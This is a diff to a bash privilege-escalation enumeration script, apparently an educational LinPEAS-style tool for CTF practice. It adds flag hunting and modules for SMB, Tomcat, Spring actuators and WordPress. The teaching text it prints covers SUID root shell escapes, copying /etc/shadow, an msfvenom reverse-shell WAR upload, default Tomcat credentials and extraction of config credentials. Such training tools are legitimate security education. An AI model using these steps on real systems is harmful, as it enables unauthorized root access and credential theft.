@@ -7,14 +7,17 @@ set -o pipefail
 # === COLORS ===
 R='\033[31m' G='\033[32m' Y='\033[33m' B='\033[34m' 
 P='\033[35m' C='\033[36m' W='\033[37m' RST='\033[0m'
-# Critical alert colors (red background + white text for maximum visibility)
+# Critical alert colors (red background + white text)
 CRIT='\033[41m\033[1;97m'
+# CTF flag alert (purple background + white text)
+FLAG='\033[45m\033[1;97m'
 
 # === CONFIGURATION ===
 VERBOSE=0
 EXPLAIN=1
 QUICK_MODE=0
-EXTENDED=1  # Extended checks (databases, web, post-exploit)
+EXTENDED=1
+SHOW_FLAGS=0  # ADD THIS LINE
 LOG_FILE="/tmp/teachpeas_$(date +%s).log"
 
 # === LOGGING ===
@@ -26,6 +29,7 @@ ok() { log "${G}[OK]${RST} $1"; }
 warn() { log "${Y}[WARNING]${RST} $1"; }
 teach() { [ $EXPLAIN -eq 1 ] && log "${Y}[LEARN]${RST} $1"; }
 critical() { log "${CRIT}[!!! CRITICAL !!!]${RST} $1"; }
+ctf_flag() { log "${FLAG}[🚩 CTF FLAG 🚩]${RST} $1"; }  # ADD THIS LINE
 
 # === EDUCATIONAL FRAMEWORK ===
 explain_concept() {
@@ -156,7 +160,7 @@ enum_sudo() {
         explain_concept "NOPASSWD Sudo" \
             "Certain commands can be run as root without entering a password." \
             "The system trusts your user identity completely for these commands. If any of these binaries can spawn a shell or write files, you can escalate. This exists because admins want automation without password prompts (cron jobs, scripts)." \
-            "Steps:\n  1. Identify which binaries have NOPASSWD\n  2. Check GTFOBins (gtfobins.github.io) for that binary\n  3. Look for 'sudo' section\n  4. Common exploitable: vim, find, python, bash, less, more, awk, perl"
+            "Steps:\n  1. Identify which binaries have NOPASSWD\n  2. Check GTFOBins (gtfobins.github.io) for that binary\n  3. Look for 'sudo' section\n  4. Common exploitable: vim, find, python, bash, less, more, awk, "
         
         log "${Y}Specific NOPASSWD entries:${RST}"
         echo "$sudo_output" | grep "NOPASSWD" | while read line; do
@@ -299,13 +303,21 @@ enum_suid() {
                     critical "SUID find - Instant root: find . -exec /bin/sh -p \\; -quit"
                     teach "  → find . -exec /bin/sh -p \\; -quit"
                     ;;
-                python*|perl|ruby|node)
+                python*|python)
                     critical "SUID $basename - Instant root: $basename -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                     teach "  → $basename -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                     ;;
-                bash|sh|zsh|dash)
-                    critical "SUID shell - Instant root: $suid_bin -p"
-                    teach "  → $suid_bin -p (preserves privileges)"
+                perl)
+                    critical "SUID perl - Instant root: perl -e 'exec \"/bin/sh\", \"-p\";'"
+                    teach "  → perl -e 'exec \"/bin/sh\", \"-p\";'"
+                    ;;
+                ruby)
+                    critical "SUID ruby - Instant root: ruby -e 'exec \"/bin/sh\", \"-p\"'"
+                    teach "  → ruby -e 'exec \"/bin/sh\", \"-p\"'"
+                    ;;
+                node)
+                    critical "SUID node - Instant root: node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
+                    teach "  → node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
                     ;;
                 cp)
                     teach "  → Copy /etc/shadow: cp /etc/shadow /tmp/shadow"
@@ -566,6 +578,7 @@ enum_post_exploit() {
 # === CTF FLAG HUNTING ===
 enum_ctf_flags() {
     [ $EXTENDED -eq 0 ] && return
+    [ $SHOW_FLAGS -eq 0 ] && return
     
     section "CTF FLAG HUNTING"
     
@@ -582,70 +595,109 @@ enum_ctf_flags() {
     
     info "Checking common flag file locations:"
     
-    # Use find for proper file discovery (globs don't work in arrays)
+    # Root flags
     find /root -maxdepth 1 -name "root.txt" -o -name "flag.txt" -o -name "proof.txt" 2>/dev/null | while read flagfile; do
         if [ -r "$flagfile" ]; then
-            critical "ROOT FLAG READABLE: $flagfile"
+            ctf_flag "ROOT FLAG READABLE: $flagfile"
             vuln "ROOT FLAG FOUND: $flagfile"
-            cat "$flagfile" 2>/dev/null
+            
+            if [ $SHOW_FLAGS -eq 1 ]; then
+                cat "$flagfile" 2>/dev/null
+            else
+                info "Use --flags to reveal flag contents"
+            fi
         else
             warn "Root flag exists but not readable: $flagfile"
             teach "Get root to read this file"
         fi
     done
     
+    # User flags
     find /home -maxdepth 2 -name "user.txt" -o -name "flag.txt" -o -name "local.txt" 2>/dev/null | while read flagfile; do
         if [ -r "$flagfile" ]; then
-            critical "USER FLAG READABLE: $flagfile"
+            ctf_flag "USER FLAG READABLE: $flagfile"
             vuln "USER FLAG FOUND: $flagfile"
-            cat "$flagfile" 2>/dev/null
+            
+            if [ $SHOW_FLAGS -eq 1 ]; then
+                cat "$flagfile" 2>/dev/null
+            else
+                info "Use --flags to reveal flag contents"
+            fi
         else
             warn "User flag exists but not readable: $flagfile"
             teach "Escalate to user $(stat -c %U "$flagfile" 2>/dev/null) to read this"
         fi
     done
     
+    # Other flag locations
     find /var/www /opt -maxdepth 3 -name "*flag*" -o -name "*.txt" 2>/dev/null | while read flagfile; do
         if [ -r "$flagfile" ] && grep -qE "flag{|HTB{|THM{|CTF{|^[a-f0-9]{32}$" "$flagfile" 2>/dev/null; then
+            ctf_flag "FLAG FOUND: $flagfile"
             vuln "FLAG FOUND: $flagfile"
-            cat "$flagfile" 2>/dev/null
+            
+            if [ $SHOW_FLAGS -eq 1 ]; then
+                cat "$flagfile" 2>/dev/null
+            else
+                info "Use --flags to reveal flag contents"
+            fi
         fi
     done
     
     info "Searching for flag patterns in readable files:"
+    local pattern_count=0
+    local total_patterns=5
+
     for pattern in "${flag_patterns[@]}"; do
-        grep -rE "$pattern" /home /var/www /opt /tmp 2>/dev/null | grep -vE "teachpeas|learnpeas|\.log:|\.sh:" | head -5 | while read match; do
-            warn "Potential flag: $match"
-        done
-    done
+    pattern_count=$((pattern_count + 1))
+    echo -ne "\r[INFO] Checking pattern $pattern_count/$total_patterns..." >&2
     
-    # Check current directory and common work directories
+    grep -rE "$pattern" /home /var/www /opt /tmp 2>/dev/null | grep -vE "teachpeas|learnpeas|\.log:|\.sh:" | head -5 | while read match; do
+        echo -ne "\r\033[K"  # Clear progress line
+        warn "Potential flag: $match"
+    done
+    done
+    echo -ne "\r\033[K"  # Clear final progress line
+    
+    # Check current directory
     if ls user.txt root.txt flag.txt 2>/dev/null | grep -q .; then
-        critical "FLAG FILE IN CURRENT DIRECTORY!"
+        ctf_flag "FLAG FILE IN CURRENT DIRECTORY!"
         vuln "Flag file in current directory!"
-        cat user.txt root.txt flag.txt 2>/dev/null
+        
+        if [ $SHOW_FLAGS -eq 1 ]; then
+            cat user.txt root.txt flag.txt 2>/dev/null
+        else
+            info "Use --flags to reveal flag contents"
+        fi
     fi
     
     # Check for encoded flags
     info "Checking for base64-encoded flags:"
     find /home /var/www /opt -type f -readable 2>/dev/null | head -100 | while read file; do
-        # Check if entire file is base64
-        if [ $(wc -l < "$file" 2>/dev/null) -eq 1 ]; then
-            local content=$(cat "$file" 2>/dev/null)
-            if echo "$content" | grep -qE "^[A-Za-z0-9+/=]{20,}$"; then
-                local decoded=$(echo "$content" | base64 -d 2>/dev/null)
-                if echo "$decoded" | grep -qE "flag{|HTB{|THM{|^[a-f0-9]{32}$"; then
-                    vuln "Base64-encoded flag in $file:"
-                    echo "$decoded"
+        # Skip binary files
+        if file "$file" | grep -q "text"; then
+            if [ $(wc -l < "$file" 2>/dev/null) -eq 1 ]; then
+               local content=$(cat "$file" 2>/dev/null)
+               if echo "$content" | grep -qE "^[A-Za-z0-9+/=]{20,}$"; then
+                   local decoded=$(echo "$content" | base64 -d 2>/dev/null)
+                   if echo "$decoded" | grep -qE "flag{|HTB{|THM{|^[a-f0-9]{32}$"; then
+                        ctf_flag "Base64-encoded flag in $file"
+                        vuln "Base64-encoded flag in $file:"
+                    
+                        if [ $SHOW_FLAGS -eq 1 ]; then
+                            echo "$decoded"
+                        else
+                            info "Use --flags to reveal flag contents"
+                        fi
+                    fi
                 fi
             fi
         fi
     done
     
-    # Check environment variables for flags
-    if env | grep -iE "flag|htb|thm" | grep -qv "EXTENDED"; then
+    # Check environment variables
+    if env | grep -iE "flag|htb|thm" | grep -qv "EXTENDED|SHOW_FLAGS"; then
         info "Flag-related environment variables:"
-        env | grep -iE "flag|htb|thm" | grep -v "EXTENDED"
+        env | grep -iE "flag|htb|thm" | grep -v "EXTENDED\|SHOW_FLAGS"
     fi
     
     teach "\nCTF-specific hiding places:"
@@ -657,7 +709,6 @@ enum_ctf_flags() {
     teach "  • Hidden with alternate data streams (NTFS)"
     teach "  • Inside zip/tar archives"
 }
-
 # === NETWORK PIVOTING ===
 enum_pivoting() {
     [ $EXTENDED -eq 0 ] && return
@@ -1299,10 +1350,11 @@ enum_clipboard() {
     
     # Check framebuffer access
     if [ -r /dev/fb0 ]; then
-        critical "Framebuffer readable - Capture screenshots of user activity"
-        vuln "Framebuffer is readable!"
-        teach "Capture screen: cat /dev/fb0 > /tmp/screen.raw"
-        teach "Convert with ffmpeg to view: ffmpeg -f fbdev -i /dev/fb0 screenshot.png"
+        warn "Framebuffer is readable"
+        info "Framebuffer access: /dev/fb0"
+        teach "Can capture screenshots: cat /dev/fb0 > /tmp/screen.raw"
+        teach "On single-user systems, this is expected behavior"
+        teach "On multi-user systems, this could expose other users' sessions"
     fi
 }
 
@@ -1792,6 +1844,12 @@ enum_env() {
         teach "Create malicious shared library and execute with any sudo command"
     fi
     
+    info "Sudo permissions detected:"
+    echo "$sudo_output" | while read line; do
+        log "  $line"
+    done
+    log ""
+    
     if sudo -l 2>/dev/null | grep -q "env_keep.*LD_LIBRARY_PATH"; then
         vuln "Sudo preserves LD_LIBRARY_PATH!"
         teach "Similar to LD_PRELOAD but points to directory containing evil library"
@@ -1878,7 +1936,349 @@ enum_interesting_files() {
         [ -r "$file" ] && log "  $file"
     done
 }
+# ═══════════════════════════════════════════════════════════════
+# ADDITIONAL ENUMERATION MODULES
+# ═══════════════════════════════════════════════════════════════
 
+# === SMB/SAMBA ENUMERATION ===
+enum_smb() {
+    section "SMB/SAMBA SHARE ENUMERATION"
+    
+    explain_concept "SMB/Samba Shares" \
+        "SMB (Server Message Block) shares allow file sharing over a network. Misconfigurations can expose sensitive files or allow unauthorized access." \
+        "Many systems allow 'null sessions' (no authentication) or have shares with weak permissions. Windows and Linux both use SMB/Samba for file sharing. HTB boxes frequently have readable or writable shares containing flags or credentials." \
+        "Exploitation:\n  1. Check for null session: smbclient -N -L //TARGET\n  2. List shares: smbmap -H TARGET\n  3. Access share: smbclient //TARGET/share -N\n  4. Look for writable shares for payload delivery"
+    
+    # Check if SMB service is actually running
+    local smb_running=0
+    if systemctl is-active --quiet smbd 2>/dev/null || systemctl is-active --quiet nmbd 2>/dev/null; then
+        smb_running=1
+        warn "SMB service is ACTIVE"
+    fi
+    
+    # Check if SMB tools are available
+    if ! command -v smbclient >/dev/null 2>&1; then
+        warn "smbclient not installed - cannot enumerate SMB shares"
+        teach "Install with: apt install smbclient"
+        return
+    fi
+    
+    # Only check for network enumeration if service is running
+    if [ $smb_running -eq 1 ]; then
+        # Check for SMB ports
+        if netstat -tuln 2>/dev/null | grep -qE ":445 |:139 "; then
+            info "SMB ports detected (445 or 139)"
+            
+            # Try localhost enumeration
+            info "Attempting null session enumeration on localhost..."
+            local smb_shares=$(smbclient -N -L //127.0.0.1 2>/dev/null | grep "Disk" | awk '{print $1}')
+            
+            if [ -n "$smb_shares" ]; then
+                critical "SMB shares accessible with null session"
+                echo "$smb_shares" | while read share; do
+                    log "  Share: $share"
+                    
+                    # Try to access the share
+                    if smbclient -N "//127.0.0.1/$share" -c "ls" 2>/dev/null | grep -q "."; then
+                        critical "Share $share is READABLE without authentication"
+                        teach "Access with: smbclient -N //127.0.0.1/$share"
+                    fi
+                done
+            else
+                ok "No null session access to SMB shares"
+            fi
+        else
+            ok "SMB ports not listening"
+        fi
+    fi
+    
+    # Check for Samba config (regardless of service status)
+    if [ -r /etc/samba/smb.conf ]; then
+        if [ $smb_running -eq 1 ]; then
+            info "Checking Samba configuration (service is running)..."
+        else
+            info "Samba configuration found but service is not running"
+        fi
+        
+        # Only flag as vulnerability if service is actually running
+        if [ $smb_running -eq 1 ]; then
+            # Check for writable shares
+            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -A 5 "\[.*\]" | grep -q "writable = yes\|read only = no"; then
+                vuln "Writable SMB shares configured in active service"
+                sed 's/[;#].*//' /etc/samba/smb.conf | grep -A 5 "writable = yes\|read only = no" | head -10
+                teach "Check share permissions and accessible paths"
+            fi
+            
+            # Check for guest access
+            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -qi "guest.*ok.*yes\|map.*to.*guest\|usershare.*allow.*guests.*yes"; then
+                vuln "Guest access configured in active Samba service"
+                warn "SMB shares allow guest access or map failed logins to guest"
+                teach "Guest can access shares without authentication"
+            fi
+        else
+            ok "Samba configured but service is inactive - no active vulnerability"
+        fi
+    fi
+}
+# === EXPOSED .GIT DIRECTORY ===
+enum_git_exposure() {
+    section "EXPOSED .GIT DIRECTORY ENUMERATION"
+    
+    explain_concept "Exposed .git Directories" \
+        "Web applications sometimes deploy with their .git directory accessible, exposing the entire source code repository including commit history." \
+        "Developers deploy code using 'git clone' or 'git pull' in the web root, forgetting that .git/ contains the complete repository. This includes all commits, deleted files, configuration with credentials, and development history. HTB boxes love this misconfiguration." \
+        "Exploitation:\n  1. Check: curl http://target/.git/config\n  2. Dump repo: git-dumper http://target/.git /output/dir\n  3. Review history: git log --all\n  4. Search for secrets: git log -p | grep -i password"
+    
+    # Check common web roots for .git
+    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
+    
+    for webroot in "${web_roots[@]}"; do
+        if [ -d "$webroot/.git" ]; then
+            critical "EXPOSED .git directory: $webroot/.git"
+            vuln "Git repository in web root: $webroot/.git"
+            
+            if [ -r "$webroot/.git/config" ]; then
+                critical "Git config readable - may contain credentials"
+                info "Git config location: $webroot/.git/config"
+                
+                # Check for remote URLs with credentials
+                if grep -E "https://.*:.*@" "$webroot/.git/config" 2>/dev/null | grep -q "."; then
+                    critical "Git remote URL contains embedded credentials"
+                    grep -E "url = " "$webroot/.git/config" 2>/dev/null
+                fi
+            fi
+            
+            # Check git logs for interesting commits
+            if [ -d "$webroot/.git" ]; then
+                cd "$webroot" 2>/dev/null && {
+                    info "Checking git commit history..."
+                    local commit_count=$(git log --all 2>/dev/null | grep "^commit" | wc -l)
+                    if [ $commit_count -gt 0 ]; then
+                        warn "Repository has $commit_count commits - review history for secrets"
+                        teach "Commands to review:"
+                        teach "  cd $webroot"
+                        teach "  git log --all"
+                        teach "  git log -p | grep -i 'password\\|secret\\|key'"
+                        teach "  git show [commit-hash]"
+                    fi
+                }
+            fi
+            
+            teach "If accessible via web:"
+            teach "  1. Use git-dumper to clone: git-dumper http://target/.git /output"
+            teach "  2. Review all branches: git branch -a"
+            teach "  3. Check deleted files: git log --diff-filter=D --summary"
+        fi
+    done
+    
+    # Check if in a git repo currently
+    if [ -d ".git" ] && [ -r ".git/config" ]; then
+        warn "Current directory is a git repository"
+        info "Git config: ./.git/config"
+        
+        if git log -p 2>/dev/null | grep -iE "password|secret|key|token" | head -3 | grep -q "."; then
+            vuln "Git history contains potential secrets"
+            teach "Review with: git log -p | grep -i password"
+        fi
+    fi
+}
+
+# === TOMCAT MANAGER ENUMERATION ===
+enum_tomcat() {
+    section "APACHE TOMCAT ENUMERATION"
+    
+    explain_concept "Tomcat Manager Application" \
+        "Apache Tomcat's manager application allows deploying WAR files. Default credentials or weak passwords give instant code execution." \
+        "Tomcat manager (/manager/html) is used to deploy web applications. If accessible with default or weak credentials, you can upload a malicious WAR file containing a web shell. This is essentially RCE with one upload. HTB loves Tomcat boxes." \
+        "Exploitation:\n  1. Access /manager/html\n  2. Try default creds: tomcat:tomcat, admin:admin, tomcat:s3cret\n  3. Generate WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war\n  4. Upload via manager interface\n  5. Trigger: curl http://target:8080/shell/"
+    
+    # Check for Tomcat ports
+    if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8009 "; then
+        warn "Tomcat ports detected (8080 or 8009)"
+        
+        # Check for Tomcat installation
+        local tomcat_dirs=("/opt/tomcat" "/usr/share/tomcat" "/var/lib/tomcat" "/opt/apache-tomcat")
+        
+        for tomcat_dir in "${tomcat_dirs[@]}"; do
+            if [ -d "$tomcat_dir" ]; then
+                info "Tomcat installation found: $tomcat_dir"
+                
+                # Check tomcat-users.xml
+                if [ -r "$tomcat_dir/conf/tomcat-users.xml" ]; then
+                    critical "tomcat-users.xml is READABLE: $tomcat_dir/conf/tomcat-users.xml"
+                    
+                    if grep -E "role.*manager" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | grep -q "."; then
+                        critical "Manager role configured with credentials"
+                        vuln "Tomcat manager credentials exposed in tomcat-users.xml"
+                        grep -E "role.*manager|user.*password" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | head -5
+                        
+                        teach "Extract credentials and access manager at:"
+                        teach "  http://localhost:8080/manager/html"
+                    fi
+                fi
+                
+                # Check for manager application
+                if [ -d "$tomcat_dir/webapps/manager" ]; then
+                    warn "Tomcat manager application is deployed"
+                    teach "Common default credentials to try:"
+                    teach "  tomcat:tomcat"
+                    teach "  admin:admin"
+                    teach "  tomcat:s3cret"
+                    teach "  admin:password"
+                fi
+            fi
+        done
+    else
+        ok "Tomcat ports not detected"
+    fi
+}
+
+# === SPRING BOOT ACTUATOR ===
+enum_spring_actuator() {
+    section "SPRING BOOT ACTUATOR ENUMERATION"
+    
+    explain_concept "Spring Boot Actuators" \
+        "Spring Boot applications expose 'actuator' endpoints for monitoring and management. Misconfigured actuators leak sensitive information or allow RCE." \
+        "Spring Boot's actuator endpoints provide app metrics, health info, and environment variables. If exposed without authentication, they leak database passwords, API keys, and app config. Some endpoints like /jolokia or /env can lead to RCE." \
+        "Common endpoints:\n  /actuator - Lists available endpoints\n  /actuator/env - Environment variables (passwords!)\n  /actuator/health - App health (sometimes shows DB status)\n  /actuator/mappings - All routes\n  /actuator/heapdump - Memory dump (credentials in memory)"
+    
+    # Check for Java processes
+    if ps aux | grep -iE "java.*spring|spring.*boot" | grep -v grep | grep -q "."; then
+        warn "Spring Boot application detected in running processes"
+        
+        info "Checking common Spring Boot actuator endpoints..."
+        
+        # Check for listening ports that might be Spring Boot
+        if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8081 |:8443 "; then
+            info "Potential Spring Boot ports detected"
+            
+            teach "If you have web access, check these endpoints:"
+            teach "  curl http://target:8080/actuator"
+            teach "  curl http://target:8080/actuator/env"
+            teach "  curl http://target:8080/actuator/heapdump"
+            teach "  curl http://target:8080/actuator/mappings"
+            teach "  curl http://target:8080/env (older Spring Boot)"
+        fi
+    fi
+    
+    # Check web roots for Spring Boot applications
+    local web_roots=("/var/www" "/opt" "/usr/local")
+    
+    for webroot in "${web_roots[@]}"; do
+        find "$webroot" -name "*.jar" 2>/dev/null | head -10 | while read jar; do
+            if unzip -l "$jar" 2>/dev/null | grep -q "spring-boot"; then
+                warn "Spring Boot JAR found: $jar"
+                
+                # Check for application.properties or application.yml
+                local app_dir=$(dirname "$jar")
+                if [ -r "$app_dir/application.properties" ]; then
+                    vuln "Spring Boot config readable: $app_dir/application.properties"
+                    
+                    if grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3 | grep -q "."; then
+                        critical "Spring Boot config contains credentials"
+                        grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3
+                    fi
+                fi
+                
+                if [ -r "$app_dir/application.yml" ]; then
+                    vuln "Spring Boot config readable: $app_dir/application.yml"
+                    
+                    if grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3 | grep -q "."; then
+                        critical "Spring Boot YAML config contains credentials"
+                        grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3
+                    fi
+                fi
+            fi
+        done
+    done
+}
+
+# === WORDPRESS EXTENDED ===
+enum_wordpress_extended() {
+    section "WORDPRESS EXTENDED ENUMERATION"
+    
+    explain_concept "WordPress Vulnerabilities" \
+        "WordPress sites have many attack surfaces: plugins, themes, xmlrpc.php, user enumeration via JSON API, and configuration backups." \
+        "WordPress is extremely common and frequently misconfigured. Plugin/theme vulnerabilities are constantly discovered. The xmlrpc.php file allows authentication brute forcing with amplification. The wp-json API leaks usernames. Config backups expose database credentials." \
+        "Attack vectors:\n  • Plugin/theme vulnerabilities (check version against exploit-db)\n  • User enumeration: curl http://site/wp-json/wp/v2/users\n  • xmlrpc.php brute force amplification\n  • wp-config.php backups (.bak, .old, ~, .save)\n  • Unprotected wp-admin/install.php"
+    
+    # Check for WordPress installations
+    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
+    
+    for webroot in "${web_roots[@]}"; do
+        if [ -f "$webroot/wp-config.php" ]; then
+            info "WordPress installation found: $webroot"
+            
+            # Check for wp-config.php
+            if [ -r "$webroot/wp-config.php" ]; then
+                critical "wp-config.php is READABLE - contains database credentials"
+                vuln "WordPress config readable: $webroot/wp-config.php"
+                
+                # Extract DB credentials
+                if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
+                    critical "Database credentials in wp-config.php"
+                    grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
+                fi
+                
+                # Check for authentication keys
+                if grep -E "AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY" "$webroot/wp-config.php" 2>/dev/null | grep -q "put your unique phrase here"; then
+                    warn "WordPress using default authentication keys"
+                    teach "Default keys = weaker session security"
+                fi
+            fi
+            
+            # Check for wp-config backups
+            find "$webroot" -name "wp-config.php*" -o -name "*wp-config*" 2>/dev/null | grep -vE "wp-config.php$" | while read backup; do
+                if [ -r "$backup" ]; then
+                    critical "wp-config backup found: $backup"
+                    vuln "WordPress config backup: $backup"
+                fi
+            done
+            
+            # Check xmlrpc.php
+            if [ -f "$webroot/xmlrpc.php" ]; then
+                warn "xmlrpc.php present - enables brute force amplification"
+                teach "Test if enabled: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target/xmlrpc.php"
+                teach "If enabled, can amplify brute force attacks significantly"
+            fi
+            
+            # Check for wp-json API
+            if [ -d "$webroot/wp-json" ] || [ -d "$webroot/wp-includes/rest-api" ]; then
+                info "WordPress REST API present"
+                teach "Enumerate users: curl http://target/wp-json/wp/v2/users"
+                teach "Leaked usernames can be used for brute forcing"
+            fi
+            
+            # Check plugins
+            if [ -d "$webroot/wp-content/plugins" ]; then
+                info "Checking installed plugins..."
+                local plugin_count=$(ls -1 "$webroot/wp-content/plugins" 2>/dev/null | wc -l)
+                warn "Found $plugin_count installed plugins"
+                
+                # List plugins
+                ls -1 "$webroot/wp-content/plugins" 2>/dev/null | head -10 | while read plugin; do
+                    log "  Plugin: $plugin"
+                    
+                    # Check for readme files that reveal version
+                    if [ -f "$webroot/wp-content/plugins/$plugin/readme.txt" ]; then
+                        local version=$(grep -i "stable tag" "$webroot/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | head -1)
+                        if [ -n "$version" ]; then
+                            info "  Version: $version"
+                            teach "  Check exploit-db for: $plugin $version"
+                        fi
+                    fi
+                done
+                
+                teach "\nPlugin enumeration:"
+                teach "  Search exploit-db: searchsploit wordpress [plugin-name]"
+                teach "  Or use: wpscan --url http://target --enumerate p"
+            fi
+        fi
+    done
+}
+
+
+# ═══════════════════════════════════════════════════════════════
 # === TOOLS AVAILABILITY ===
 enum_tools() {
     section "INSTALLED TOOLS & COMPILERS"
@@ -1948,18 +2348,36 @@ enum_wildcards() {
 
 # === MAIN EXECUTION ===
 main() {
-    log "${G}╔═══════════════════════════════════════╗${RST}"
-    log "${G}║         TeachPEAS - Red Team Bible           ║${RST}"
-    log "${G}║   Comprehensive Privilege Escalation Guide   ║${RST}"
-    log "${G}╚═══════════════════════════════════════╝${RST}"
-    log ""
-    log "${Y}Purpose: Enumerate + Educate${RST}"
-    log "${Y}Every finding includes WHY and HOW${RST}"
-    log ""
-    log "Logging to: $LOG_FILE"
-    log "Started: $(date)"
-    log ""
+    cat << "EOF"
+
+    ════════════════════════════════════════════════════════════════
+EOF
+    echo -e ""
+    echo -e "\033[31mM\"\"\033[33mMMMMMMMM\033[0m                                     \033[34mMM\"\"\"\"\"\"\"'YM\033[0m                            "
+    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m                                     \033[34mMM  mmmmm  M\033[0m                            "
+    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m .d8888b. .d8888b. 88d888b. 88d888b. \033[34mM'        .M\033[0m .d8888b. .d8888b. .d8888b. "
+    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88ooood8 88'  '88 88'  '88 88'  '88 \033[34mMM  MMMMMMMM\033[0m 88ooood8 88'  '88 Y8ooooo. "
+    echo -e "\033[31mM  \033[33mMMMMMMMM\033[0m 88.  ... 88.  .88 88       88    88 \033[34mMM  MMMMMMMM\033[0m 88.  ... 88.  .88       88 "
+    echo -e "\033[31mM  \033[32m       M\033[0m '88888P' '88888P8 dP       dP    dP \033[34mMM  MMMMMMMM\033[0m '88888P' '88888P8 '88888P' "
+    echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
+    cat << "EOF"
     
+              Educational Privilege Escalation Tool - v1.0
+    
+    ════════════════════════════════════════════════════════════════
+
+EOF
+    
+    log "${G}════════════════════════════════════════════════════════════════${RST}"
+    log "${Y}[*] Purpose: Educational enumeration with detailed explanations${RST}"
+    log "${Y}[*] Every vulnerability includes WHAT, WHY, and HOW to exploit${RST}"
+    log "${R}[!] For authorized testing only - HTB/THM/OSCP practice${RST}"
+    log "${G}════════════════════════════════════════════════════════════════${RST}"
+    log ""
+    log "${C}[+] Log file: $LOG_FILE${RST}"
+    log "${C}[+] Started: $(date)${RST}"
+    log "${P}[+] Extended mode: ENABLED${RST}"
+    log ""
     # Core enumeration
     enum_system
     enum_network
@@ -2002,6 +2420,13 @@ main() {
     enum_passwords
     enum_interesting_files
     
+    #  HTB-specific enumeration
+    enum_smb
+    enum_git_exposure
+    enum_tomcat
+    enum_spring_actuator
+    enum_wordpress_extended
+    
     # Tools
     enum_tools
     enum_scheduled
@@ -2037,6 +2462,20 @@ main() {
             log "$line"
         done
         log ""
+    fi
+    
+    # CTF flags summary
+    if grep -q "CTF FLAG" "$LOG_FILE"; then
+        section "🚩 CTF FLAGS DISCOVERED"
+        log "${FLAG}Flag locations found:${RST}"
+        log ""
+        grep "\[🚩 CTF FLAG 🚩\]" "$LOG_FILE" | while read line; do
+           log "$line"
+        done
+        log ""
+        if [ $SHOW_FLAGS -eq 0 ]; then
+            info "Rerun with --flags to reveal flag contents"
+       fi
     fi
     
     section "ENUMERATION COMPLETE"
@@ -2075,6 +2514,10 @@ while [ $# -gt 0 ]; do
             ;;
         --no-explain)
             EXPLAIN=0
+            shift
+            ;;
+            -f|--flags) 
+            SHOW_FLAGS=1
             shift
             ;;
         -h|--help)
